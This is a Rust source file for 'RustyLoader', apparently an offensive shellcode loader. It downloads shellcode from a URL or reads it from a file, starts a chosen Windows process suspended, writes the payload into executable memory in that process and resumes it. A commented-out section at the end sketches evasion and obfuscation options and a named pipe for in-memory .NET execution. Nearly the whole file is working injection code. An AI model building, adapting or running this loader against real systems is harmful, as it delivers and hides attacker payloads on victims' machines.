use std::{
    ptr::null_mut,
    fs::{self},
    error::Error,
};

use clap::{Command, ArgMatches, Arg};

use reqwest::blocking;

use bytes::Bytes;

use windows::core::PWSTR;
use windows::Win32::Foundation::{FALSE, CloseHandle};
use windows::Win32::System::{ 
    Threading::{CreateProcessW, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW, ResumeThread},
    Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;


fn check_string_type(input: &str) -> &str {
    if input.starts_with("http://") || input.starts_with("https://") {
        "URL"
    } else {
        "File"
    }
}


fn get_shellcode_from_url(url_path: &str) -> Result<Bytes, Box<dyn Error>> {
    let client = blocking::Client::new();
    let res = client.get(url_path).send()?;
    return res.bytes().map_err(|e| Box::new(e) as Box<dyn Error>);
}

fn spawn_suspended_process(target_path: &str) -> Result<PROCESS_INFORMATION, Box<dyn std::error::Error>> {
    // convert to wide
    let mut target_wide: Vec<u16> = target_path.encode_utf16().collect();
    target_wide.push(0); // null term

    // structs for process creation
    let mut startup_info = STARTUPINFOW::default();
    let mut process_info = PROCESS_INFORMATION::default();

    // create process
    let result = unsafe {
        CreateProcessW(
            None,
            PWSTR(target_wide.as_mut_ptr()),
            None,
            None,
            FALSE,
            CREATE_SUSPENDED,
            None,
            None,
            &mut startup_info,
            &mut process_info,
        )?
    };
    Ok(process_info)
}

fn inject_shellcode(process_info: &PROCESS_INFORMATION, shellcode: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    // virtual alloc
    let allocated_memory = unsafe {
        VirtualAllocEx(
            process_info.hProcess,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if allocated_memory.is_null() {
        return Err("Failed to allocate memory in target".into());
    }

    // write shellcode to mem
    let mut bytes_written: usize = 0;
    let success = unsafe {
        WriteProcessMemory(
            process_info.hProcess,
            allocated_memory,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&mut bytes_written as *mut usize),
        )
    };

    if bytes_written != shellcode.len() {
        return Err("Failed to write shellcode to target".into());
    }

    // resume suspended process
    let thread_result = unsafe { ResumeThread(process_info.hThread) };

    if thread_result == u32::MAX {
        return Err("Failed to resume thread".into());
    }

    Ok(())
}


fn main() -> Result<(), Box<dyn std::error::Error>> {

    let matches = Command::new("RustyLoader")
    .arg(
        Arg::new("path")
            .short('p')
            .long("path")
            .help("URL or Local file path to beacon. URL must point to the file containing shellcode")
            .required(true)
    ).arg(
        Arg::new("process")
            .short('P')
            .long("process")
            .help("Path to process")
            .required(true)
    );

    let found: ArgMatches = matches.get_matches();
    
    let shellcode_path = found.get_one::<String>("path").unwrap();
    let process_path = found.get_one::<String>("process").unwrap();

    let shellcode: Result<Bytes, Box<dyn Error>>;

    let path_type_check = check_string_type(&shellcode_path);
    
    if path_type_check == "URL" {
        //get shellcode from url
        shellcode = get_shellcode_from_url(&shellcode_path);
    } else if path_type_check == "File" {
        shellcode = fs::read(shellcode_path).map(Bytes::from).map_err(|e| Box::new(e) as Box<dyn Error>);
    } else {
        shellcode = Err("Invalid path type. Must be a URL or File.".into());
        panic!("Error.")
    }
    
    let suspended_process = spawn_suspended_process(&process_path)?;
    match shellcode {
        Ok(shellcode_bytes) => {
            println!("Shellcode loaded successfully, size: {} bytes", shellcode_bytes.len());

            // Inject the shellcode (convert Bytes to &[u8] with .as_ref())
            inject_shellcode(&suspended_process, shellcode_bytes.as_ref())?;
        }
        Err(e) => {
            eprintln!("Failed to load shellcode: {}", e);
            return Err(e);
        }
    }

    Ok(())
    
}

/*
    let pipe_name = found.get_one::<String>("named-pipe").unwrap();

    ).arg(
        Arg::new("obfuscate")
            .short('o')
            .long("obfuscate")
            .help("URL to words dict")
            .required(false)
    )
    .arg(
        Arg::new("evasion")
            .short('e')
            .long("evasion")
            .help("Enable evasion")
            .required(false)
    )
    .arg(
        Arg::new("named-pipe")
            .short('n')
            .long("named-pipe")
            .help("Named pipe for assembly dotNet reflection and output")
            .required(true)
    )

    //named pipe for communication
    // let pipe = create_named_pipe(pipe_name)?;

    // //wait for shellcode connection & send/receive data
    // unsafe {
    //     ConnectNamedPipe(pipe, null_mut());

    //     let mut buffer = [0u8; 1024];
    //     let mut bytes_read = 0;
    //     ReadFile(pipe, buffer.as_mut_ptr() as *mut _, buffer.len() as u32, &mut bytes_read, null_mut());

    //     CloseHandle(pipe);
    // }


fn create_named_pipe(pipe_name: &str) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let c_pipe_name = CString::new(pipe_name)?;
    let pipe = unsafe {
        CreateNamedPipeA(
            c_pipe_name.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_WAIT,
            1,
            1024,
            1024,
            0,
            null_mut(),
        )
    };

    if pipe == HANDLE(0) {
        return Err("Failed to create named pipe".into());
    }

    Ok(pipe)
}
    */
